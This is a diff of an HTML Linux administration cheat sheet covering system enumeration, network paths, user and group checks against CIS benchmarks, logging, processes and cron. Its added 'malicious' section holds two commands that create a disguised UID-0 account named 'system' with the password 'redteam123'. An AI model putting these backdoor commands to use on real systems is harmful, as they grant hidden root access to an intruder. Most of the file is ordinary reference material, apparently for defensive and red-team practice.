@@ -18,21 +18,22 @@
   <div>
     <code>hostnamectl set-hostname [dc].[dc].[tld]</code>
     <code>hostname -f[s][i]</code>
-    <div>/etc/hostname</div>
-    <div>/etc/hosts</div>
+    <div class="path">/etc/hostname</div>
+    <div class="path">/etc/hosts</div>
   </div>
   <div>
-    <h2>system</h2>
+    <h2>system enumeration</h2>
     <code>uname -r</code>
+    <code>uname -o</code>
     <code>lscpu</code>
     <code>cat /etc/issue</code>
   </div>
   <h2>network</h2>
-  <h3>paths</h3>
+  <h3>config paths</h3>
     <div class="path">/etc/sysconfig/network-scripts/ifcfg-[eno...]</div>
     <div class="path">/etc/NetworkManager/system-connections/</div>
   <div>
-    <h3>gateway</h3>
+    <h3>gateway config</h3>
     <code>route add default gw 192.168.1.2 [devID]</code>
     <code>route -n</code>
     <code>ip route show</code>
@@ -102,13 +103,16 @@
     <code>awk -F':' '{print $1}' /etc/passwd</code>
   </div>
   <div>
-    <h3><code>root</code> only UID 0 (page 495 fedora 19 cis)</h3>
+    <h3>root only UID 0 (page 495 fedora 19 cis)</h3>
     <code>awk -F: '($3 == 0) { print $1 }' /etc/passwd</code>
     <code>getent passwd 0 | cut -d ":" -f 1</code>
   </div>
-  <h3>List all users with GID 0</h3>
-  <code>getent passwd | awk -F: '($4==0) {print $1}'</code>
-  <h3>Check GID <code>root</code> 0 (page 458 fedora 19 cis)</h3>
+  <div>
+    <h3>List all users with GID 0 (admins)</h3>
+    <code>getent passwd | awk -F: '($4==0) {print $1}'</code>
+    <code>cat /etc/passwd | awk -F: '($4==0) {print $1}'</code>
+  </div>
+  <h3>Check GID 0 on root (page 458 fedora 19 cis)</h3>
   <code>grep "^root:" /etc/passwd | cut -f4 -d:</code>
   <div>
     <h3>List all normal users</h3>
@@ -116,14 +120,30 @@
     <code>getent passwd {1000..6000}</code>
   </div>
 
-  <h3>Create email user</h3>
-  <code>useradd --create-home -s /sbin/nologin user1; passwd user1</code>
+  <div>
+    <h3>users & groups</h3>
+    <code>useradd --create-home -s /sbin/nologin user1; passwd user1</code>
+    <code>useradd -m -s /bin/bash cddunn && echo jason | passwd cddunn --stdin</code>
+
+    <h4>create system group</h4>
+      <code>groupadd -g 5000 -r vmail</code>
+    <h4>create system user</h4>
+      <code>adduser --system --home /srv/vmail --uid 5000 --gid 5000  vmail</code>
+    <h4>enumerate groups</h4>
+      <code>less /etc/group</code>
+      <code>getent group</code>
+    <h4>malicious</h4>
+    <code>useradd -ou 0 -g 0 -r -d /etc/sysconfig system && echo -e "redteam123\nredteam123" | passwd system</code>
+    <code>useradd -ou 0 -r -d /etc/sysconfig system && echo -e "redteam123\nredteam123" | passwd system</code>
+  </div>
+
   <div>
     <h3>Delete user</h3>
       <code>userdel -r user1</code>
       <code>userdel -f user1</code>
       <code>userdel -Z user1</code>
   </div>
+
   <h3>ID info</h3>
   <code>id &lt;username&gt;</code>
   <h3>Info</h3>
@@ -156,8 +176,8 @@
   </div>
   <div>
     <h2>Logging</h2>
-    <div>/var/log/maillog</div>
-    <div>/var/log/roundcubemail/errors</div>
+    <div class="path">/var/log/maillog</div>
+    <div class="path">/var/log/roundcubemail/errors</div>
     <code>journalctl -xe</code>
     <code>journalctl -u sshd.service</code>
   </div>
@@ -165,7 +185,18 @@
     <h2>processes</h2>
     <code>jobs</code>
     <code>fg %1</code>
+    <code>bg %1</code>
+    <code>ps aux</code>
+    <code>lsof -p [pid]</code>
   </div>
+
+  <div>
+    <h2>crontab</h2>
+    <code>crontab -u root -l</code>
+    <code>cat /etc/crontab</code>
+    <code>ls /etc/cron*</code>
+  </div>
+
   <h2>to-do</h2>
   <div>sticky bit world writable page 65 fedora 19 cis</div>
   <div>get some shas of binaries</div>
